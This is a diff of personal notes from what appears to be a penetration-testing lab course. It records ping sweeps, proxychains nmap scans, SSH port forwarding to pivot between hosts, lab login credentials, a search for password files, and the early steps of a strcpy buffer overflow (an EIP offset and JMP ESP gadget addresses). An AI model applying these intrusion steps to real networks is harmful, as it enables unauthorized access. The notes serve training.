@@ -3,8 +3,8 @@ HAST-006-M
 base64 and rot13 encoding throughout this module
 linux - 10.50.31.3
 windows - 10.50.44.112
-
-BOX1 - 10.50.41.56
+# PART 1
+## BOX1 - 10.50.41.56
 
 PORT   STATE SERVICE
 22/tcp open  ssh
@@ -148,3 +148,86 @@ find reference # and nc listener script as we see
 root@defense-nix1-19:/home/devops# scp -r RE_this student@10.50.44.112:C:
 copied to my windows box, used ghidra to decode it and saw num >> 2 == 21 i used this 
 https://bit-calculator.com/bit-shift-calculator to help find that a num that fits the first input is 85 
+
+
+
+# PART 2
+ping net again
+will have creds
+see 2 more ips (will include the sql ip as well)
+moveup.exe lev for priv escalation 
+
+www-data@ministry-defense-19:~$ for i in {1..254}; do (ping -c 1 192.168.28.$i | grep "bytes from" &); done
+64 bytes from 192.168.28.5: icmp_seq=1 ttl=127 time=2.00 ms
+64 bytes from 192.168.28.10: icmp_seq=1 ttl=63 time=1.60 ms
+64 bytes from 192.168.28.19: icmp_seq=1 ttl=63 time=1.43 ms
+64 bytes from 192.168.28.30: icmp_seq=1 ttl=64 time=0.682 ms (IGNORE)
+64 bytes from 192.168.28.177: icmp_seq=1 ttl=63 time=1.68 ms 
+64 bytes from 192.168.28.182: icmp_seq=1 ttl=63 time=1.68 ms 
+64 bytes from 192.168.28.190: icmp_seq=1 ttl=64 time=0.312 ms (IGNORE)
+
+student@lin-ops:~$ proxychains nmap -T4 -Pn -sT -v 192.168.28.5,10,19
+Nmap scan report for 192.168.28.5
+Host is up (0.0016s latency).
+Not shown: 994 closed ports
+PORT     STATE SERVICE
+22/tcp   open  ssh
+135/tcp  open  msrpc
+139/tcp  open  netbios-ssn
+445/tcp  open  microsoft-ds
+3389/tcp open  ms-wbt-server
+9999/tcp open  abyss
+
+Nmap scan report for 192.168.28.10
+Host is up (0.0015s latency).
+Not shown: 999 closed ports
+PORT   STATE SERVICE
+22/tcp open  ssh
+
+Nmap scan report for 192.168.28.19
+Host is up (0.0016s latency).
+Not shown: 999 closed ports
+PORT   STATE SERVICE
+22/tcp open  ssh
+
+
+.5 definetly windows , going to look at the other 2 boxes first 
+
+student@lin-ops:~/.ssh$ ssh -S /tmp/mind mind -O forward -L 1503:192.168.28.10:22
+student@lin-ops:~/.ssh$ ssh -S /tmp/mind mind -O forward -L 1504:192.168.28.19:22
+
+un:Rsanch        pwd:ScaryTerry
+un:Msmith        pwd:Squanchy
+un:Fpalic        pwd:Birdperson
+un:Kmichae       pwd:MrMeeseeks
+
+lets try to brute force these
+
+Msmith was used to get into .19 (p1504)
+Kmichae was used to get into the .10 (p1503) which immediataely had a flag in the banner upon access
+.19 is the r-and-d-nix1-19
+.10 is the r-and-d-nix2-19
+
+
+## nix1 
+
+Msmith@r-and-d-nix1-19:/$ find / -iname "*password*.txt" 2>/dev/null
+
+
+
+## nix 2
+
+gdb-peda$ pdisass test
+   0x08048508 <+28>:	call   0x8048330 <strcpy@plt>
+function in red so the function is strcpy()
+
+after overflowing the exploit_this
+we find the EIP value is 0x33624132 = 38 yay
+
+find /b 0xf7ded000, 0xf7ffe000, 0xff, 0xe4
+
+
+0xf7defb51
+0xf7f6474b
+0xf7f70753
+0xf7f70c6b
